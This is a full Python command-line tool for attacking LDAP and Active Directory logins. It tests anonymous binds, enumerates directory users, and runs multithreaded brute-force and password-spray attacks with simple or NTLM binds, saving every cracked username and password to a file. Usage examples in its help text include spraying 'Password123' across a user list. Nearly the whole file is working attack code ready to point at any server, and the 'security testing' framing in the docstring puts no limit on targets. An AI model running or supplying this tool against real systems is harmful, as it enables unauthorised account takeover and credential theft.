#!/usr/bin/env python3
"""
LDAP Brute Force Tool
A comprehensive utility for testing LDAP authentication security through
controlled brute force attacks, user enumeration, and credential testing.
"""

import argparse
import sys
import time
import threading
import queue
import logging
from typing import Optional, List, Tuple, Dict
from datetime import datetime
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# Try importing ldap3 with fallback message
try:
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, ALL_ATTRIBUTES, core
    from ldap3.core.exceptions import LDAPException, LDAPBindError, LDAPInvalidCredentialsResult
    LDAP_AVAILABLE = True
except ImportError:
    LDAP_AVAILABLE = False

class LDAPBruteForcer:
    """
    Main class for LDAP brute force operations
    Supports anonymous binds, user enumeration, and password attacks
    """
    
    # Common LDAP ports
    LDAP_PORTS = {
        'ldap': 389,
        'ldaps': 636,
        'global_catalog': 3268,
        'global_catalog_ssl': 3269
    }
    
    # Common AD username patterns
    USERNAME_PATTERNS = [
        "{username}",           # Simple username
        "{username}@{domain}",  # UPN format
        "{domain}\\{username}", # Down-level logon name
        "cn={username},{base}"  # DN format
    ]
    
    def __init__(self, target: str, domain: Optional[str] = None, port: int = 389,
                 use_ssl: bool = False, timeout: int = 5, verbose: bool = False):
        """
        Initialize LDAP brute forcer
        
        Args:
            target: LDAP server address
            domain: Domain name for NTLM authentication
            port: LDAP port
            use_ssl: Use LDAPS
            timeout: Connection timeout
            verbose: Enable verbose output
        """
        if not LDAP_AVAILABLE:
            raise ImportError("ldap3 module is required. Install with: pip install ldap3")
        
        self.target = target
        self.domain = domain
        self.port = port
        self.use_ssl = use_ssl
        self.timeout = timeout
        self.verbose = verbose
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'start_time': None
        }
        
        # Setup logging
        self.setup_logging()
        
        # Server object (will be initialized per connection)
        self.server = Server(
            target,
            port=port,
            use_ssl=use_ssl,
            get_info=ALL,
            connect_timeout=timeout
        )
    
    def setup_logging(self):
        """Configure logging"""
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        if self.verbose:
            logging.basicConfig(level=logging.DEBUG, format=log_format)
        else:
            logging.basicConfig(level=logging.INFO, format=log_format)
        self.logger = logging.getLogger(__name__)
    
    def test_anonymous_bind(self) -> bool:
        """
        Test if anonymous bind is allowed
        
        Returns:
            True if anonymous bind successful
        """
        try:
            conn = Connection(self.server, auto_bind=True)
            conn.unbind()
            self.logger.info("[+] Anonymous bind successful!")
            return True
        except LDAPException as e:
            self.logger.debug(f"[-] Anonymous bind failed: {e}")
            return False
    
    def get_server_info(self) -> Dict:
        """
        Retrieve server information
        
        Returns:
            Dictionary with server information
        """
        info = {}
        try:
            conn = Connection(self.server, auto_bind=True)
            
            # Get server info
            if self.server.info:
                info['vendor'] = self.server.info.vendor_name
                info['version'] = self.server.info.vendor_version
                info['naming_contexts'] = self.server.info.naming_contexts
            
            # Try to get root DSE info
            conn.search(search_base='', search_filter='(objectClass=*)', 
                       search_scope='BASE', attributes=['*'])
            if conn.entries:
                info['root_dse'] = str(conn.entries[0])
            
            conn.unbind()
            
        except Exception as e:
            self.logger.debug(f"Could not retrieve server info: {e}")
        
        return info
    
    def enumerate_users(self, base_dn: str = None, user_filter: str = "(|(objectClass=user)(objectClass=person))",
                        attributes: List[str] = None, max_results: int = 1000) -> List[Dict]:
        """
        Enumerate users from LDAP
        
        Args:
            base_dn: Base DN for search
            user_filter: LDAP filter for users
            attributes: Attributes to retrieve
            max_results: Maximum number of results
        
        Returns:
            List of user dictionaries
        """
        users = []
        
        if not base_dn:
            # Try to discover base DN
            base_dn = self.discover_base_dn()
            if not base_dn:
                self.logger.error("[-] Could not discover base DN")
                return users
        
        if not attributes:
            attributes = ['cn', 'sAMAccountName', 'userPrincipalName', 'mail', 'distinguishedName']
        
        try:
            conn = Connection(self.server, auto_bind=True)
            
            conn.search(
                search_base=base_dn,
                search_filter=user_filter,
                search_scope=SUBTREE,
                attributes=attributes,
                size_limit=max_results
            )
            
            for entry in conn.entries:
                user_info = {}
                for attr in attributes:
                    if hasattr(entry, attr):
                        user_info[attr] = str(getattr(entry, attr))
                users.append(user_info)
            
            conn.unbind()
            self.logger.info(f"[+] Enumerated {len(users)} users")
            
        except Exception as e:
            self.logger.error(f"[-] User enumeration failed: {e}")
        
        return users
    
    def discover_base_dn(self) -> Optional[str]:
        """
        Discover base DN from server information
        
        Returns:
            Base DN string or None
        """
        try:
            conn = Connection(self.server, auto_bind=True)
            
            if self.server.info and self.server.info.naming_contexts:
                # Return first naming context
                base_dn = self.server.info.naming_contexts[0]
                conn.unbind()
                return base_dn
            
            # Try to query root DSE
            conn.search(search_base='', search_filter='(objectClass=*)', 
                       search_scope='BASE', attributes=['defaultNamingContext'])
            
            if conn.entries and 'defaultNamingContext' in conn.entries[0]:
                base_dn = str(conn.entries[0]['defaultNamingContext'])
                conn.unbind()
                return base_dn
            
            conn.unbind()
            
        except Exception as e:
            self.logger.debug(f"Base DN discovery failed: {e}")
        
        return None
    
    def format_username(self, username: str, pattern: str, base_dn: Optional[str] = None) -> str:
        """
        Format username according to pattern
        
        Args:
            username: Raw username
            pattern: Username pattern
            base_dn: Base DN for DN format
        
        Returns:
            Formatted username
        """
        replacements = {
            '{username}': username,
            '{domain}': self.domain if self.domain else '',
            '{base}': base_dn if base_dn else ''
        }
        
        formatted = pattern
        for key, value in replacements.items():
            formatted = formatted.replace(key, value)
        
        return formatted
    
    def test_credentials(self, username: str, password: str, 
                        auth_type: str = 'SIMPLE') -> Tuple[bool, Optional[str]]:
        """
        Test a single credential pair
        
        Args:
            username: Username to test
            password: Password to test
            auth_type: Authentication type ('SIMPLE' or 'NTLM')
        
        Returns:
            Tuple of (success, error_message)
        """
        try:
            if auth_type.upper() == 'NTLM' and self.domain:
                # NTLM authentication
                user = f"{self.domain}\\{username}"
                conn = Connection(
                    self.server,
                    user=user,
                    password=password,
                    authentication=NTLM,
                    auto_bind=True
                )
            else:
                # Simple authentication
                conn = Connection(
                    self.server,
                    user=username,
                    password=password,
                    auto_bind=True
                )
            
            conn.unbind()
            return True, None
            
        except LDAPInvalidCredentialsResult:
            return False, "Invalid credentials"
        except LDAPBindError as e:
            return False, str(e)
        except LDAPException as e:
            return False, str(e)
        except Exception as e:
            return False, str(e)
    
    def worker(self, task_queue: queue.Queue, auth_type: str, 
               base_dn: Optional[str] = None, delay: float = 0):
        """
        Worker thread for processing credential tests
        
        Args:
            task_queue: Queue with (username, password) tuples
            auth_type: Authentication type
            base_dn: Base DN for DN format
            delay: Delay between attempts
        """
        while not self.stop_event.is_set():
            try:
                username, password = task_queue.get(timeout=1)
            except queue.Empty:
                break
            
            # Format username based on pattern if base_dn provided
            test_username = username
            if base_dn and not ('@' in username or '\\' in username or '=' in username):
                # Try common patterns
                for pattern in self.USERNAME_PATTERNS:
                    test_username = self.format_username(username, pattern, base_dn)
                    success, error = self.test_credentials(test_username, password, auth_type)
                    
                    with self.lock:
                        self.stats['attempts'] += 1
                        
                        if success:
                            self.stats['successes'] += 1
                            cred = {
                                'username': username,
                                'password': password,
                                'auth_string': test_username,
                                'timestamp': datetime.now().isoformat()
                            }
                            self.found_credentials.append(cred)
                            self.logger.info(f"[+] SUCCESS: {test_username}:{password}")
                            break
                        else:
                            self.stats['failures'] += 1
                    
                    if self.verbose and not success:
                        self.logger.debug(f"[-] Failed: {test_username}:{password} - {error}")
                    
                    if delay > 0:
                        time.sleep(delay)
                
                # If all patterns failed with same username
                continue
            
            # Single format attempt
            success, error = self.test_credentials(test_username, password, auth_type)
            
            with self.lock:
                self.stats['attempts'] += 1
                
                if success:
                    self.stats['successes'] += 1
                    cred = {
                        'username': username,
                        'password': password,
                        'auth_string': test_username,
                        'timestamp': datetime.now().isoformat()
                    }
                    self.found_credentials.append(cred)
                    self.logger.info(f"[+] SUCCESS: {test_username}:{password}")
                else:
                    self.stats['failures'] += 1
                    if self.verbose:
                        self.logger.debug(f"[-] Failed: {test_username}:{password} - {error}")
            
            if delay > 0:
                time.sleep(delay)
            
            task_queue.task_done()
    
    def brute_force(self, usernames: List[str], passwords: List[str],
                   auth_type: str = 'SIMPLE', threads: int = 5,
                   delay: float = 0, max_attempts: Optional[int] = None) -> List[Dict]:
        """
        Perform brute force attack
        
        Args:
            usernames: List of usernames to test
            passwords: List of passwords to test
            auth_type: Authentication type
            threads: Number of concurrent threads
            delay: Delay between attempts
            max_attempts: Maximum number of attempts
        
        Returns:
            List of found credentials
        """
        self.logger.info(f"[*] Starting brute force attack")
        self.logger.info(f"[*] Usernames: {len(usernames)}")
        self.logger.info(f"[*] Passwords: {len(passwords)}")
        self.logger.info(f"[*] Total combinations: {len(usernames) * len(passwords):,}")
        self.logger.info(f"[*] Threads: {threads}")
        self.logger.info(f"[*] Auth type: {auth_type}")
        
        # Discover base DN if needed
        base_dn = None
        if auth_type.upper() == 'SIMPLE':
            base_dn = self.discover_base_dn()
            if base_dn:
                self.logger.info(f"[*] Discovered base DN: {base_dn}")
        
        # Create task queue
        task_queue = queue.Queue()
        attempt_count = 0
        
        for username in usernames:
            for password in passwords:
                task_queue.put((username, password))
                attempt_count += 1
                if max_attempts and attempt_count >= max_attempts:
                    break
            if max_attempts and attempt_count >= max_attempts:
                break
        
        self.stats['start_time'] = time.time()
        
        # Start worker threads
        threads_list = []
        for _ in range(min(threads, attempt_count)):
            t = threading.Thread(
                target=self.worker,
                args=(task_queue, auth_type, base_dn, delay)
            )
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        # Monitor progress
        try:
            while any(t.is_alive() for t in threads_list):
                time.sleep(1)
                if self.stats['attempts'] % 10 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    rate = self.stats['attempts'] / elapsed if elapsed > 0 else 0
                    self.logger.info(
                        f"[*] Progress: {self.stats['attempts']}/{attempt_count} "
                        f"({(self.stats['attempts']/attempt_count)*100:.1f}%) "
                        f"| Rate: {rate:.2f} attempts/sec "
                        f"| Found: {len(self.found_credentials)}"
                    )
        except KeyboardInterrupt:
            self.logger.info("[!] Interrupted by user")
            self.stop_event.set()
        
        # Wait for threads to finish
        for t in threads_list:
            t.join(timeout=5)
        
        elapsed = time.time() - self.stats['start_time']
        self.logger.info(f"[*] Attack completed in {elapsed:.2f} seconds")
        self.logger.info(f"[*] Total attempts: {self.stats['attempts']:,}")
        self.logger.info(f"[*] Successful: {len(self.found_credentials)}")
        
        return self.found_credentials
    
    def password_spray(self, usernames: List[str], password: str,
                      auth_type: str = 'SIMPLE', delay: float = 2) -> List[Dict]:
        """
        Perform password spraying attack (one password, many usernames)
        
        Args:
            usernames: List of usernames to test
            password: Single password to try
            auth_type: Authentication type
            delay: Delay between attempts to avoid lockouts
        
        Returns:
            List of found credentials
        """
        self.logger.info(f"[*] Starting password spray with password: {password}")
        self.logger.info(f"[*] Testing {len(usernames)} users")
        
        return self.brute_force(
            usernames=usernames,
            passwords=[password],
            auth_type=auth_type,
            threads=1,  # Single thread for password spray
            delay=delay
        )
    
    def save_results(self, output_file: str):
        """Save found credentials to file"""
        if not self.found_credentials:
            self.logger.info("[-] No credentials found to save")
            return
        
        with open(output_file, 'w') as f:
            f.write("LDAP Brute Force Results\n")
            f.write("=" * 50 + "\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Domain: {self.domain if self.domain else 'N/A'}\n")
            f.write(f"Date: {datetime.now().isoformat()}\n")
            f.write("=" * 50 + "\n\n")
            
            for cred in self.found_credentials:
                f.write(f"Username: {cred['username']}\n")
                f.write(f"Password: {cred['password']}\n")
                f.write(f"Auth String: {cred['auth_string']}\n")
                f.write(f"Timestamp: {cred['timestamp']}\n")
                f.write("-" * 30 + "\n")
        
        self.logger.info(f"[+] Results saved to: {output_file}")
    
    def load_wordlist(self, wordlist_file: str) -> List[str]:
        """Load words from a file"""
        words = []
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            self.logger.info(f"[+] Loaded {len(words)} entries from {wordlist_file}")
        except Exception as e:
            self.logger.error(f"[-] Failed to load wordlist: {e}")
        return words

def parse_usernames(username_input: str) -> List[str]:
    """
    Parse username input (file or comma-separated list)
    
    Args:
        username_input: File path or comma-separated list
    
    Returns:
        List of usernames
    """
    usernames = []
    
    # Check if input is a file
    if os.path.isfile(username_input):
        with open(username_input, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
    else:
        # Comma-separated list
        usernames = [u.strip() for u in username_input.split(',') if u.strip()]
    
    return usernames

def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='LDAP Brute Force Tool - Test LDAP authentication security',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Anonymous bind test
  python ldap_bruteforce.py ldap.example.com --anonymous
  
  # User enumeration
  python ldap_bruteforce.py ldap.example.com --enumerate -o users.txt
  
  # Brute force with wordlists
  python ldap_bruteforce.py ldap.example.com -U users.txt -P passwords.txt -t 5
  
  # Password spray attack
  python ldap_bruteforce.py ldap.example.com -U users.txt --spray "Password123"
  
  # NTLM authentication
  python ldap_bruteforce.py ldap.example.com -U users.txt -P passwords.txt --domain example.com --ntlm
        """
    )
    
    # Target arguments
    parser.add_argument('target', help='LDAP server address')
    parser.add_argument('-p', '--port', type=int, default=389, help='LDAP port (default: 389)')
    parser.add_argument('-s', '--ssl', action='store_true', help='Use LDAPS')
    parser.add_argument('--domain', help='Domain for NTLM authentication')
    
    # Authentication type
    parser.add_argument('--ntlm', action='store_true', help='Use NTLM authentication')
    
    # Attack modes
    parser.add_argument('--anonymous', action='store_true', help='Test anonymous bind')
    parser.add_argument('--enumerate', action='store_true', help='Enumerate users')
    parser.add_argument('--spray', metavar='PASSWORD', help='Password spray attack with single password')
    
    # Credential arguments
    parser.add_argument('-U', '--usernames', help='Usernames file or comma-separated list')
    parser.add_argument('-P', '--passwords', help='Passwords file')
    
    # Attack options
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between attempts in seconds')
    parser.add_argument('--max-attempts', type=int, help='Maximum number of attempts')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    
    # Output options
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--info', action='store_true', help='Get server information')
    
    args = parser.parse_args()
    
    # Check if ldap3 is available
    if not LDAP_AVAILABLE:
        print("[!] ldap3 module is required. Install with: pip install ldap3")
        sys.exit(1)
    
    try:
        # Initialize brute forcer
        forcer = LDAPBruteForcer(
            target=args.target,
            domain=args.domain,
            port=args.port,
            use_ssl=args.ssl,
            timeout=args.timeout,
            verbose=args.verbose
        )
        
        print(f"\n{'='*60}")
        print(f"LDAP Brute Force Tool")
        print(f"{'='*60}")
        print(f"Target: {args.target}:{args.port}")
        print(f"SSL: {args.ssl}")
        if args.domain:
            print(f"Domain: {args.domain}")
        print(f"{'='*60}\n")
        
        # Test anonymous bind
        if args.anonymous:
            if forcer.test_anonymous_bind():
                print("[!] WARNING: Anonymous bind is enabled!")
            else:
                print("[*] Anonymous bind is disabled")
        
        # Get server info
        if args.info:
            info = forcer.get_server_info()
            print("\nServer Information:")
            for key, value in info.items():
                print(f"  {key}: {value}")
        
        # Enumerate users
        if args.enumerate:
            users = forcer.enumerate_users()
            if users:
                print(f"\nFound {len(users)} users:")
                for user in users[:10]:  # Show first 10
                    print(f"  - {user}")
                if len(users) > 10:
                    print(f"  ... and {len(users) - 10} more")
                
                # Save to file if output specified
                if args.output:
                    with open(args.output, 'w') as f:
                        for user in users:
                            f.write(f"{user.get('sAMAccountName', user.get('cn', 'Unknown'))}\n")
                    print(f"[+] Users saved to: {args.output}")
        
        # Perform brute force attack
        if args.usernames and (args.passwords or args.spray):
            # Load usernames
            usernames = parse_usernames(args.usernames)
            if not usernames:
                print("[-] No valid usernames provided")
                sys.exit(1)
            
            # Load passwords
            passwords = []
            if args.spray:
                passwords = [args.spray]
            elif args.passwords:
                if os.path.isfile(args.passwords):
                    passwords = forcer.load_wordlist(args.passwords)
                else:
                    passwords = [p.strip() for p in args.passwords.split(',')]
            
            if not passwords:
                print("[-] No valid passwords provided")
                sys.exit(1)
            
            # Choose attack type
            auth_type = 'NTLM' if args.ntlm else 'SIMPLE'
            
            if args.spray:
                # Password spray
                found = forcer.password_spray(
                    usernames=usernames,
                    password=args.spray,
                    auth_type=auth_type,
                    delay=args.delay
                )
            else:
                # Standard brute force
                found = forcer.brute_force(
                    usernames=usernames,
                    passwords=passwords,
                    auth_type=auth_type,
                    threads=args.threads,
                    delay=args.delay,
                    max_attempts=args.max_attempts
                )
            
            # Save results
            if found and args.output:
                forcer.save_results(args.output)
        
        # No action specified
        if not any([args.anonymous, args.enumerate, args.info, 
                   (args.usernames and (args.passwords or args.spray))]):
            print("[!] No action specified. Use -h for help.")
            parser.print_help()
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
